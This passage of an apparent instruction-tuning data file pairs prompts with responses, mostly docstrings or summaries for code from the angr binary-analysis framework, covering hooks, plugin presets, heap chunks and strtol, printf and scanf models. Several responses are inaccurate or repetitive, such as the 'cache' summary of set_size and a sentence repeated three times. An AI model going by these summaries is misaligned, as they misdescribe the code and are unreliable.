     elif replace is False:\n                l.warning(\"Address is already hooked, during hook(%s, %s). Not re-hooking.\", self._addr_to_str(addr), hook)\n                return\n            else:\n                l.warning(\"Address is already hooked, during hook(%s, %s). Re-hooking.\", self._addr_to_str(addr), hook)\n\n        if isinstance(hook, type):\n            raise TypeError(\"Please instanciate your SimProcedure before hooking with it\")\n\n        if callable(hook):\n            hook = SIM_PROCEDURES['stubs']['UserHook'](user_func=hook, length=length, **kwargs)\n\n        self._sim_procedures[addr] = hook"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef hooked_by(self, addr):\n\n        if not self.is_hooked(addr):\n            l.warning(\"Address %s is not hooked\", self._addr_to_str(addr))\n            return None\n\n        return self._sim_procedures[addr]", "response": "Returns the current hook for addr."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef unhook(self, addr):\n        if not self.is_hooked(addr):\n            l.warning(\"Address %s not hooked\", self._addr_to_str(addr))\n            return\n\n        del self._sim_procedures[addr]", "response": "Removes a hook from the list of functions that are hooked at the given address."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nresolving a dependency in a binary and hook it with the actual version of the module.", "response": "def hook_symbol(self, symbol_name, simproc, kwargs=None, replace=None):\n        \"\"\"\n        Resolve a dependency in a binary. Looks up the address of the given symbol, and then hooks that\n        address. If the symbol was not available in the loaded libraries, this address may be provided\n        by the CLE externs object.\n\n        Additionally, if instead of a symbol name you provide an address, some secret functionality will\n        kick in and you will probably just hook that address, UNLESS you're on powerpc64 ABIv1 or some\n        yet-unknown scary ABI that has its function pointers point to something other than the actual\n        functions, in which case it'll do the right thing.\n\n        :param symbol_name: The name of the dependency to resolve.\n        :param simproc:     The SimProcedure instance (or function) with which to hook the symbol\n        :param kwargs:      If you provide a SimProcedure for the hook, these are the keyword\n                            arguments that will be passed to the procedure's `run` method\n                            eventually.\n        :param replace:     Control the behavior on finding that the address is already hooked. If\n                            true, silently replace the hook. If false, warn and do not replace the\n                            hook. If none (default), warn and replace the hook.\n        :returns:           The address of the new symbol.\n        :rtype:             int\n        \"\"\"\n        if type(symbol_name) is not int:\n            sym = self.loader.find_symbol(symbol_name)\n            if sym is None:\n                # it could be a previously unresolved weak symbol..?\n                new_sym = None\n                for reloc in self.loader.find_relevant_relocations(symbol_name):\n                    if not reloc.symbol.is_weak:\n                        raise Exception(\"Symbol is strong but we couldn't find its resolution? Report to @rhelmot.\")\n                    if new_sym is None:\n                        new_sym = self.loader.extern_object.make_extern(symbol_name)\n                    reloc.resolve(new_sym)\n                    reloc.relocate([])\n\n                if new_sym is None:\n                    l.error(\"Could not find symbol %s\", symbol_name)\n                    return None\n                sym = new_sym\n\n            basic_addr = sym.rebased_addr\n        else:\n            basic_addr = symbol_name\n            symbol_name = None\n\n        hook_addr, _ = self.simos.prepare_function_symbol(symbol_name, basic_addr=basic_addr)\n\n        self.hook(hook_addr, simproc, kwargs=kwargs, replace=replace)\n        return hook_addr"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef is_symbol_hooked(self, symbol_name):\n        sym = self.loader.find_symbol(symbol_name)\n        if sym is None:\n            l.warning(\"Could not find symbol %s\", symbol_name)\n            return False\n        hook_addr, _ = self.simos.prepare_function_symbol(symbol_name, basic_addr=sym.rebased_addr)\n        return self.is_hooked(hook_addr)", "response": "Check if a symbol is already hooked."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef unhook_symbol(self, symbol_name):\n        sym = self.loader.find_symbol(symbol_name)\n        if sym is None:\n            l.warning(\"Could not find symbol %s\", symbol_name)\n            return False\n        if sym.owner is self.loader._extern_object:\n            l.warning(\"Refusing to unhook external symbol %s, replace it with another hook if you want to change it\",\n                      symbol_name)\n            return False\n\n        hook_addr, _ = self.simos.prepare_function_symbol(symbol_name, basic_addr=sym.rebased_addr)\n        self.unhook(hook_addr)\n        return True", "response": "Unhook a hook on a symbol."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nmove the hook for a specific symbol to a specific address", "response": "def rehook_symbol(self, new_address, symbol_name):\n        \"\"\"\n        Move the hook for a symbol to a specific address\n        :param new_address: the new address that will trigger the SimProc execution\n        :param symbol_name: the name of the symbol (f.i. strcmp )\n        :return: None\n        \"\"\"\n        new_sim_procedures = {}\n        for key_address, simproc_obj in self._sim_procedures.items():\n            if simproc_obj.display_name == symbol_name:\n                new_sim_procedures[new_address] = simproc_obj\n            else:\n                new_sim_procedures[key_address] = simproc_obj\n\n        self._sim_procedures = new_sim_procedures"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef execute(self, *args, **kwargs):\n\n        if args:\n            state = args[0]\n        else:\n            state = self.factory.full_init_state(**kwargs)\n\n        pg = self.factory.simulation_manager(state)\n        self._executing = True\n        return pg.run(until=lambda lpg: not self._executing)", "response": "This function is a simple style symbolic execution helper that returns a simulation manager that is ready to be used to execute the entry point."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _hook_decorator(self, addr, length=0, kwargs=None):\n\n        def hook_decorator(func):\n            self.hook(addr, func, length=length, kwargs=kwargs)\n            return func\n\n        return hook_decorator", "response": "A decorator that allows easy hooking of the current object."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef is_java_project(self):\n        if self._is_java_project is None:\n            self._is_java_project = isinstance(self.arch, ArchSoot)\n        return self._is_java_project", "response": "Indicates if the project s main binary is a Java Archive."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nindicate if the project s main binary is a Java Archive which contains native libraries.", "response": "def is_java_jni_project(self):\n        \"\"\"\n        Indicates if the project's main binary is a Java Archive, which\n        interacts during its execution with native libraries (via JNI).\n        \"\"\"\n        if self._is_java_jni_project is None:\n            self._is_java_jni_project = isinstance(self.arch, ArchSoot) and self.simos.is_javavm_with_jni_support\n        return self._is_java_jni_project"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef register_preset(cls, name, preset):\n        if cls._presets is None:\n            cls._presets = {}\n        cls._presets[name] = preset", "response": "Register a preset instance with the class of the hub."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\napply a preset to the hub.", "response": "def use_plugin_preset(self, preset):\n        \"\"\"\n        Apply a preset to the hub. If there was a previously active preset, discard it.\n\n        Preset can be either the string name of a preset or a PluginPreset instance.\n        \"\"\"\n        if isinstance(preset, str):\n            try:\n                preset = self._presets[preset]\n            except (AttributeError, KeyError):\n                raise AngrNoPluginError(\"There is no preset named %s\" % preset)\n\n        elif not isinstance(preset, PluginPreset):\n            raise ValueError(\"Argument must be an instance of PluginPreset: %s\" % preset)\n\n        if self._active_preset:\n            l.warning(\"Overriding active preset %s with %s\", self._active_preset, preset)\n            self.discard_plugin_preset()\n\n        preset.activate(self)\n        self._active_preset = preset"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ndiscarding the current active preset. Will release any plugins that were previously provided by the old preset. Will release any plugins that were previously provided by the old preset. Will release any plugins that were previously provided by the old preset.", "response": "def discard_plugin_preset(self):\n        \"\"\"\n        Discard the current active preset. Will release any active plugins that could have come from the old preset.\n        \"\"\"\n        if self.has_plugin_preset:\n            for name, plugin in list(self._active_plugins.items()):\n                if id(plugin) in self._provided_by_preset:\n                    self.release_plugin(name)\n            self._active_preset.deactivate(self)\n        self._active_preset = None"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nget the named plugin.", "response": "def get_plugin(self, name):\n        \"\"\"\n        Get the plugin named ``name``. If no such plugin is currently active, try to activate a new\n        one using the current preset.\n        \"\"\"\n        if name in self._active_plugins:\n            return self._active_plugins[name]\n\n        elif self.has_plugin_preset:\n            plugin_cls = self._active_preset.request_plugin(name)\n            plugin = self._init_plugin(plugin_cls)\n\n            # Remember that this plugin was provided by preset.\n            self._provided_by_preset.append(id(plugin))\n\n            self.register_plugin(name, plugin)\n            return plugin\n\n        else:\n            raise AngrNoPluginError(\"No such plugin: %s\" % name)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef register_plugin(self, name, plugin):\n        if self.has_plugin(name):\n            self.release_plugin(name)\n        self._active_plugins[name] = plugin\n        setattr(self, name, plugin)\n        return plugin", "response": "Register a new plugin with the given name."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ndeactivate and remove the plugin with name name.", "response": "def release_plugin(self, name):\n        \"\"\"\n        Deactivate and remove the plugin with name ``name``.\n        \"\"\"\n        plugin = self._active_plugins[name]\n        if id(plugin) in self._provided_by_preset:\n            self._provided_by_preset.remove(id(plugin))\n\n        del self._active_plugins[name]\n        delattr(self, name)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef copy(self):\n        cls = self.__class__\n        result = cls.__new__(cls)\n        result._default_plugins = dict(self._default_plugins)  # pylint:disable=protected-access\n        return result", "response": "Return a copy of self."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _grab_concretization_results(cls, state):\n        # only grab ones that match the constrained addrs\n        if cls._should_add_constraints(state):\n            addr = state.inspect.address_concretization_expr\n            result = state.inspect.address_concretization_result\n            if result is None:\n                l.warning(\"addr concretization result is None\")\n                return\n            state.preconstrainer.address_concretization.append((addr, result))", "response": "Grabs the concretized result so we can add the constraint ourselves."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nchecking to see if the current concretization variable is any of the constrained_addrs we want to allow concretization for", "response": "def _should_add_constraints(cls, state):\n        \"\"\"\n        Check to see if the current address concretization variable is any of the registered\n        constrained_addrs we want to allow concretization for\n        \"\"\"\n        expr = state.inspect.address_concretization_expr\n        hit_indices = cls._to_indices(state, expr)\n\n        for action in state.preconstrainer._constrained_addrs:\n            var_indices = cls._to_indices(state, action.addr)\n            if var_indices == hit_indices:\n                return True\n        return False"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef allocate(self, sim_size):\n        size = self._conc_alloc_size(sim_size)\n        addr = self.state.heap.heap_location\n        self.state.heap.heap_location += size\n        l.debug(\"Allocating %d bytes at address %#08x\", size, addr)\n        return addr", "response": "Allocates memory for the current heap entry."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ngets the function name from a C - style function declaration string.", "response": "def get_function_name(s):\n    \"\"\"\n    Get the function name from a C-style function declaration string.\n\n    :param str s: A C-style function declaration string.\n    :return:      The function name.\n    :rtype:       str\n    \"\"\"\n\n    s = s.strip()\n    if s.startswith(\"__attribute__\"):\n        # Remove \"__attribute__ ((foobar))\"\n        if \"))\" not in s:\n            raise ValueError(\"__attribute__ is present, but I cannot find double-right parenthesis in the function \"\n                             \"declaration string.\")\n\n        s = s[s.index(\"))\") + 2 : ].strip()\n\n    if '(' not in s:\n        raise ValueError(\"Cannot find any left parenthesis in the function declaration string.\")\n\n    func_name = s[:s.index('(')].strip()\n\n    for i, ch in enumerate(reversed(func_name)):\n        if ch == ' ':\n            pos = len(func_name) - 1 - i\n            break\n    else:\n        raise ValueError('Cannot find any space in the function declaration string.')\n\n    func_name = func_name[pos + 1 : ]\n    return func_name"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nconverting a C - style function declaration string to its corresponding SimTypes - based Python representation.", "response": "def convert_cproto_to_py(c_decl):\n    \"\"\"\n    Convert a C-style function declaration string to its corresponding SimTypes-based Python representation.\n\n    :param str c_decl:              The C-style function declaration string.\n    :return:                        A tuple of the function name, the prototype, and a string representing the\n                                    SimType-based Python representation.\n    :rtype:                         tuple\n    \"\"\"\n\n    s = [ ]\n\n    try:\n        s.append('# %s' % c_decl)  # comment string\n\n        parsed = parse_file(c_decl)\n        parsed_decl = parsed[0]\n        if not parsed_decl:\n            raise ValueError('Cannot parse the function prototype.')\n\n        func_name, func_proto = next(iter(parsed_decl.items()))\n\n        s.append('\"%s\": %s,' % (func_name, func_proto._init_str()))  # The real Python string\n\n    except Exception:  # pylint:disable=broad-except\n        # Silently catch all parsing errors... supporting all function declarations is impossible\n        try:\n            func_name = get_function_name(c_decl)\n            func_proto = None\n            s.append('\"%s\": None,' % func_name)\n        except ValueError:\n            # Failed to extract the function name. Is it a function declaration?\n            func_name, func_proto = None, None\n\n    return func_name, func_proto, \"\\n\".join(s)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef set_size(self, size, is_free=None):  #pylint:disable=arguments-differ\n        self._set_leading_size(size)\n        next_chunk = self.next_chunk()\n        if is_free is not None:\n            if next_chunk is not None:\n                next_chunk.set_prev_freeness(is_free)\n            else:\n                self.heap._set_final_freeness(is_free)\n        if is_free is not None and is_free or self.is_free():\n            if next_chunk is not None:\n                self.state.memory.store(next_chunk.base, size)", "response": "Set the size of the an arbitrary number of entries in the cache."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nset the flag controlling whether the previous chunk is free.", "response": "def set_prev_freeness(self, is_free):\n        \"\"\"\n        Sets (or unsets) the flag controlling whether the previous chunk is free.\n\n        :param is_free: if True, sets the previous chunk to be free; if False, sets it to be allocated\n        \"\"\"\n        level = silence_logger()\n        size_field = self.state.memory.load(self.base + self._chunk_size_t_size, self._chunk_size_t_size)\n        unsilence_logger(level)\n        if is_free:\n            self.state.memory.store(self.base + self._chunk_size_t_size, size_field & ~CHUNK_P_MASK)\n        else:\n            self.state.memory.store(self.base + self._chunk_size_t_size, size_field | CHUNK_P_MASK)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef is_prev_free(self):\n        flag = self.state.memory.load(self.base + self._chunk_size_t_size, self._chunk_size_t_size) & CHUNK_P_MASK\n\n        def sym_flag_handler(flag):\n            l.warning(\"A chunk's P flag is symbolic; assuming it is not set\")\n            return self.state.solver.min_int(flag)\n\n        flag = concretize(flag, self.state.solver, sym_flag_handler)\n        return False if flag else True", "response": "Returns a concrete state of the flag indicating whether the previous chunk is free."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef prev_size(self):\n        return self.state.memory.load(self.base, self._chunk_size_t_size) & ~CHUNK_FLAGS_MASK", "response": "Returns the size of the previous chunk."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns the next chunk in the PT.", "response": "def next_chunk(self):\n        \"\"\"\n        Returns the chunk immediately following (and adjacent to) this one, if it exists.\n\n        :returns: The following chunk, or None if applicable\n        \"\"\"\n\n        def sym_base_handler(base):\n            l.warning(\"A computed chunk base is symbolic; maximizing it\")\n            return self.state.solver.max_int(base)\n\n        base = concretize(self.base + self.get_size(), self.state.solver, sym_base_handler)\n        if base >= self.heap.heap_base + self.heap.heap_size - 2 * self._chunk_size_t_size:\n            return None\n        else:\n            return PTChunk(base, self.state)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn the chunk immediately prior to this one.", "response": "def prev_chunk(self):\n        \"\"\"\n        Returns the chunk immediately prior (and adjacent) to this one, if that chunk is free. If the prior chunk is not\n        free, then its base cannot be located and this method raises an error.\n\n        :returns: If possible, the previous chunk; otherwise, raises an error\n        \"\"\"\n        if self.is_prev_free():\n            return PTChunk(self.base - self.prev_size(), self.state)\n        else:\n            raise SimHeapError(\"Attempted to access the previous chunk, but it was not free\")"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef fwd_chunk(self):\n        if self.is_free():\n            base = self.state.memory.load(self.base + 2 * self._chunk_size_t_size, self._chunk_size_t_size)\n            return PTChunk(base, self.state)\n        else:\n            raise SimHeapError(\"Attempted to access the forward chunk of an allocated chunk\")", "response": "Returns the chunk following this chunk in the list of free chunks."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ngiving a pointer to a user payload return the base of the chunk associated with that payload. Returns None if the user payload is null.", "response": "def chunk_from_mem(self, ptr):\n        \"\"\"\n        Given a pointer to a user payload, return the base of the chunk associated with that payload (i.e. the chunk\n        pointer). Returns None if ptr is null.\n\n        :param ptr: a pointer to the base of a user payload in the heap\n        :returns: a pointer to the base of the associated heap chunk, or None if ptr is null\n        \"\"\"\n        if self.state.solver.symbolic(ptr):\n            try:\n                ptr = self.state.solver.eval_one(ptr)\n            except SimSolverError:\n                l.warning(\"A pointer to a chunk is symbolic; maximizing it\")\n                ptr = self.state.solver.max_int(ptr)\n        else:\n            ptr = self.state.solver.eval(ptr)\n        return PTChunk(ptr - (2 * self._chunk_size_t_size), self.state) if ptr != 0 else None"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nfinding the free chunk that would be the backwards chunk relative to the chunk at ptr.", "response": "def _find_bck(self, chunk):\n        \"\"\"\n        Simply finds the free chunk that would be the backwards chunk relative to the chunk at ptr. Hence, the free head\n        and all other metadata are unaltered by this function.\n        \"\"\"\n        cur = self.free_head_chunk\n        if cur is None:\n            return None\n        fwd = cur.fwd_chunk()\n        if cur == fwd:\n            return cur\n        # At this point there should be at least two free chunks in the heap\n        if cur < chunk:\n            while cur < fwd < chunk:\n                cur = fwd\n                fwd = cur.fwd_chunk()\n            return cur\n        else:\n            while fwd != self.free_head_chunk:\n                cur = fwd\n                fwd = cur.fwd_chunk()\n            return cur"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nsetting the freedom of the final chunk.", "response": "def _set_final_freeness(self, flag):\n        \"\"\"\n        Sets the freedom of the final chunk. Since no proper chunk follows the final chunk, the heap itself manages\n        this. Nonetheless, for now it is implemented as if an additional chunk followed the final chunk.\n        \"\"\"\n        if flag:\n            self.state.memory.store(self.heap_base + self.heap_size - self._chunk_size_t_size, ~CHUNK_P_MASK)\n        else:\n            self.state.memory.store(self.heap_base + self.heap_size - self._chunk_size_t_size, CHUNK_P_MASK)"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nmakes a suitable chunk size for the given allocation size.", "response": "def _make_chunk_size(self, req_size):\n        \"\"\"\n        Takes an allocation size as requested by the user and modifies it to be a suitable chunk size.\n        \"\"\"\n        size = req_size\n        size += 2 * self._chunk_size_t_size  # Two size fields\n        size = self._chunk_min_size if size < self._chunk_min_size else size\n        if size & self._chunk_align_mask:                                         # If the chunk would not be aligned\n            size = (size & ~self._chunk_align_mask) + self._chunk_align_mask + 1  # Fix it\n        return size"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nallocating and initialize a new string in the context of the state passed.", "response": "def new_string(state, value):\n        \"\"\"\n        Allocate and initialize a new string in the context of the state passed.\n\n        The method returns the reference to the newly allocated string\n\n        :param state: angr state where we want to allocate the string\n        :type SimState\n        :param value: value of the string to initialize\n        :type claripy.String\n\n        :return SimSootValue_StringRef\n        \"\"\"\n        str_ref = SimSootValue_StringRef(state.memory.get_new_uuid())\n        state.memory.store(str_ref, value)\n        return str_ref"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef strtol_inner(s, state, region, base, signed, read_length=None):\n\n        # sanity check\n        if base < 2 or base > 36:\n            raise SimProcedureError(\"base should be in the range [2,36]\")\n\n        # order matters here since we will use an if then else tree, and -0x will have precedence over -\n        prefixes = [b\"-\", b\"+\", b\"\"]\n        if base == 16:\n            prefixes = [b\"0x\", b\"-0x\", b\"+0x\"] + prefixes\n\n        cases = []\n        conditions = []\n        possible_num_bytes = []\n\n        for prefix in prefixes:\n            if read_length and read_length < len(prefix):\n                continue\n            condition, value, num_bytes = strtol._load_num_with_prefix(prefix, s, region, state, base, signed, read_length)\n            conditions.append(condition)\n            cases.append((condition, value))\n            possible_num_bytes.append(num_bytes)\n\n        # only one of the cases needed to match\n        result = state.solver.ite_cases(cases[:-1], cases[-1][1])\n        expression = state.solver.Or(*conditions)\n        num_bytes = state.solver.ite_cases(zip(conditions, possible_num_bytes), 0)\n        return expression, result, num_bytes", "response": "Internal function to parse a string in the specified region."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _load_num_with_prefix(prefix, addr, region, state, base, signed, read_length=None):\n        length = len(prefix)\n        read_length = (read_length-length) if read_length else None\n        condition, value, num_bytes = strtol._string_to_int(addr+length, state, region, base, signed, read_length)\n\n        # the prefix must match\n        if len(prefix) > 0:\n            loaded_prefix = region.load(addr, length)\n            condition = state.solver.And(loaded_prefix == state.solver.BVV(prefix), condition)\n        total_num_bytes = num_bytes + length\n\n        # negatives\n        if prefix.startswith(b\"-\"):\n            value = state.solver.BVV(0, state.arch.bits) - value\n        return condition, value, total_num_bytes", "response": "Loads a number from addr and returns a condition that the prefix matches the current base."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreading a string and generates a symbolic number that is equal to the value of the current entry in the given region.", "response": "def _string_to_int(s, state, region, base, signed, read_length=None):\n        \"\"\"\n        reads values from s and generates the symbolic number that it would equal\n        the first char is either a number in the given base, or the result is 0\n        expression indicates whether or not it was successful\n        \"\"\"\n\n        # if length wasn't provided, read the maximum bytes\n        length = state.libc.max_strtol_len if read_length is None else read_length\n\n        # expression whether or not it was valid at all\n        expression, _ = strtol._char_to_val(region.load(s, 1), base)\n\n        cases = []\n\n        # to detect overflows we keep it in a larger bv and extract it at the end\n        num_bits = min(state.arch.bits*2, 128)\n        current_val = state.solver.BVV(0, num_bits)\n        num_bytes = state.solver.BVS(\"num_bytes\", state.arch.bits)\n        constraints_num_bytes = []\n        conditions = []\n\n        cutoff = False\n        # we need all the conditions to hold except the last one to have found a value\n        for i in range(length):\n            char = region.load(s + i, 1)\n            condition, value = strtol._char_to_val(char, base)\n\n            # if it was the end we'll get the current val\n            cases.append((num_bytes == i, current_val))\n\n            # identify the constraints necessary to set num_bytes to the current value\n            # the current char (i.e. the terminator if this is satisfied) should not be a char,\n            # so `condition` should be false, plus all the previous conditions should be satisfied\n            case_constraints = conditions + [state.solver.Not(condition)] + [num_bytes == i]\n            constraints_num_bytes.append(state.solver.And(*case_constraints))\n\n            # break the loop early if no value past this is viable\n            if condition.is_false():\n                cutoff = True  # ???\n                break\n\n            # add the value and the condition\n            current_val = current_val*base + value.zero_extend(num_bits-8)\n            conditions.append(condition)\n\n        # the last one is unterminated, let's ignore it\n        if not cutoff:\n            cases.append((num_bytes == length, current_val))\n            case_constraints = conditions + [num_bytes == length]\n            constraints_num_bytes.append(state.solver.And(*case_constraints))\n\n        # only one of the constraints need to hold\n        # since the constraints look like (num_bytes == 2 and the first 2 chars are valid, and the 3rd isn't)\n\n        final_constraint = state.solver.Or(*constraints_num_bytes)\n        if final_constraint.op == '__eq__' and final_constraint.args[0] is num_bytes and not final_constraint.args[1].symbolic:\n            # CONCRETE CASE\n            result = cases[state.solver.eval(final_constraint.args[1])][1]\n            num_bytes = final_constraint.args[1]\n        else:\n            # symbolic case\n            state.add_constraints(final_constraint)\n            result = state.solver.ite_cases(cases, 0)\n\n        # overflow check\n        max_bits = state.arch.bits-1 if signed else state.arch.bits\n        max_val = 2**max_bits - 1\n        result = state.solver.If(result < max_val, state.solver.Extract(state.arch.bits-1, 0, result),\n                             state.solver.BVV(max_val, state.arch.bits))\n\n        return expression, result, num_bytes"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nconverts a symbolic char to a number in the given base.", "response": "def _char_to_val(char, base):\n        \"\"\"\n        converts a symbolic char to a number in the given base\n        returns expression, result\n        expression is a symbolic boolean indicating whether or not it was a valid number\n        result is the value\n        \"\"\"\n        cases = []\n        # 0-9\n        max_digit = claripy.BVV(b\"9\")\n        min_digit = claripy.BVV(b\"0\")\n        if base < 10:\n            max_digit = claripy.BVV(ord(\"0\") + base, 8)\n        is_digit = claripy.And(char >= min_digit, char <= max_digit)\n        # return early here so we don't add unnecessary statements\n        if base <= 10:\n            return is_digit, char - min_digit\n\n        # handle alphabetic chars\n        max_char_lower = claripy.BVV(ord(\"a\") + base-10 - 1, 8)\n        max_char_upper = claripy.BVV(ord(\"A\") + base-10 - 1, 8)\n        min_char_lower = claripy.BVV(ord(\"a\"), 8)\n        min_char_upper = claripy.BVV(ord(\"A\"), 8)\n\n        cases.append((is_digit, char - min_digit))\n        is_alpha_lower = claripy.And(char >= min_char_lower, char <= max_char_lower)\n        cases.append((is_alpha_lower, char - min_char_lower + 10))\n        is_alpha_upper = claripy.And(char >= min_char_upper, char <= max_char_upper)\n        cases.append((is_alpha_upper, char - min_char_upper + 10))\n\n        expression = claripy.Or(is_digit, is_alpha_lower, is_alpha_upper)\n        # use the last case as the default, the expression will encode whether or not it's satisfiable\n        result = claripy.ite_cases(cases[:-1], cases[-1][1])\n\n        return expression, result"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef replace(self, startpos, args):\n\n        argpos = startpos\n        string = None\n\n        for component in self.components:\n            # if this is just concrete data\n            if isinstance(component, bytes):\n                string = self._add_to_string(string, self.parser.state.solver.BVV(component))\n            elif isinstance(component, str):\n                raise Exception(\"this branch should be impossible?\")\n            elif isinstance(component, claripy.ast.BV):\n                string = self._add_to_string(string, component)\n            else:\n                # okay now for the interesting stuff\n                # what type of format specifier is it?\n                fmt_spec = component\n                if fmt_spec.spec_type == b's':\n                    if fmt_spec.length_spec == b\".*\":\n                        str_length = args(argpos)\n                        argpos += 1\n                    else:\n                        str_length = None\n                    str_ptr = args(argpos)\n                    string = self._add_to_string(string, self._get_str_at(str_ptr, max_length=str_length))\n                # integers, for most of these we'll end up concretizing values..\n                else:\n                    i_val = args(argpos)\n                    c_val = int(self.parser.state.solver.eval(i_val))\n                    c_val &= (1 << (fmt_spec.size * 8)) - 1\n                    if fmt_spec.signed and (c_val & (1 << ((fmt_spec.size * 8) - 1))):\n                        c_val -= (1 << fmt_spec.size * 8)\n\n                    if fmt_spec.spec_type in (b'd', b'i'):\n                        s_val = str(c_val)\n                    elif fmt_spec.spec_type == b'u':\n                        s_val = str(c_val)\n                    elif fmt_spec.spec_type == b'c':\n                        s_val = chr(c_val & 0xff)\n                    elif fmt_spec.spec_type == b'x':\n                        s_val = hex(c_val)[2:]\n                    elif fmt_spec.spec_type == b'o':\n                        s_val = oct(c_val)[2:]\n                    elif fmt_spec.spec_type == b'p':\n                        s_val = hex(c_val)\n                    else:\n                        raise SimProcedureError(\"Unimplemented format specifier '%s'\" % fmt_spec.spec_type)\n\n                    string = self._add_to_string(string, self.parser.state.solver.BVV(s_val.encode()))\n\n                argpos += 1\n\n        return string", "response": "Implement printf - based on the stored format specifier information."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ninterpreting the format of the format element in memory or a file.", "response": "def interpret(self, startpos, args, addr=None, simfd=None):\n        \"\"\"\n        implement scanf - extract formatted data from memory or a file according to the stored format\n        specifiers and store them into the pointers extracted from `args`.\n\n        :param startpos:    The index of the first argument corresponding to the first format element\n        :param args:        A function which, given the index of an argument to the function, returns that argument\n        :param addr:        The address in the memory to extract data from, or...\n        :param simfd:       A file descriptor to use for reading data from\n        :return:            The number of arguments parsed\n        \"\"\"\n        if simfd is not None and isinstance(simfd.read_storage, SimPackets):\n            argnum = startpos\n            for component in self.components:\n                if type(component) is bytes:\n                    sdata, _ = simfd.read_data(len(component), short_reads=False)\n                    self.state.solver.add(sdata == component)\n                elif isinstance(component, claripy.Bits):\n                    sdata, _ = simfd.read_data(len(component) // 8, short_reads=False)\n                    self.state.solver.add(sdata == component)\n                elif component.spec_type == b's':\n                    if component.length_spec is None:\n                        sdata, slen = simfd.read_data(self.state.libc.buf_symbolic_bytes)\n                    else:\n                        sdata, slen = simfd.read_data(component.length_spec)\n                    for byte in sdata.chop(8):\n                        self.state.solver.add(claripy.And(*[byte != char for char in self.SCANF_DELIMITERS]))\n                    self.state.memory.store(args(argnum), sdata, size=slen)\n                    self.state.memory.store(args(argnum) + slen, claripy.BVV(0, 8))\n                    argnum += 1\n                elif component.spec_type == b'c':\n                    sdata, _ = simfd.read_data(1, short_reads=False)\n                    self.state.memory.store(args(argnum), sdata)\n                    argnum += 1\n                else:\n                    bits = component.size * 8\n                    if component.spec_type == b'x':\n                        base = 16\n                    elif component.spec_type == b'o':\n                        base = 8\n                    else:\n                        base = 10\n\n                    # here's the variable representing the result of the parsing\n                    target_variable = self.state.solver.BVS('scanf_' + component.string.decode(), bits,\n                            key=('api', 'scanf', argnum - startpos, component.string))\n                    negative = claripy.SLT(target_variable, 0)\n\n                    # how many digits does it take to represent this variable fully?\n                    max_digits = int(math.ceil(math.log(2**bits, base)))\n\n                    # how many digits does the format specify?\n                    spec_digits = component.length_spec\n\n                    # how many bits can we specify as input?\n                    available_bits = float('inf') if spec_digits is None else spec_digits * math.log(base, 2)\n                    not_enough_bits = available_bits < bits\n\n                    # how many digits will we model this input as?\n                    digits = max_digits if spec_digits is None else spec_digits\n\n                    # constrain target variable range explicitly if it can't take on all possible values\n                    if not_enough_bits:\n                        self.state.solver.add(self.state.solver.And(\n                            self.state.solver.SLE(target_variable, (base**digits) - 1),\n                            self.state.solver.SGE(target_variable, -(base**(digits - 1) - 1))))\n\n                    # perform the parsing in reverse - constrain the input digits to be the string version of the input\n                    # this only works because we're reading from a packet stream and therefore nobody has the ability\n                    # to add other constraints to this data!\n                    # this makes z3's job EXTREMELY easy\n                    sdata, _ = simfd.read_data(digits, short_reads=False)\n                    for i, digit in enumerate(reversed(sdata.chop(8))):\n                        digit_value = (target_variable // (base**i)) % base\n                        digit_ascii = digit_value + ord('0')\n                        if base > 10:\n                            digit_ascii = claripy.If(digit_value >= 10, digit_value + (-10 + ord('a')), digit_ascii)\n\n                        # if there aren't enough bits, we can increase the range by accounting for the possibility that\n                        # the first digit is a minus sign\n                        if 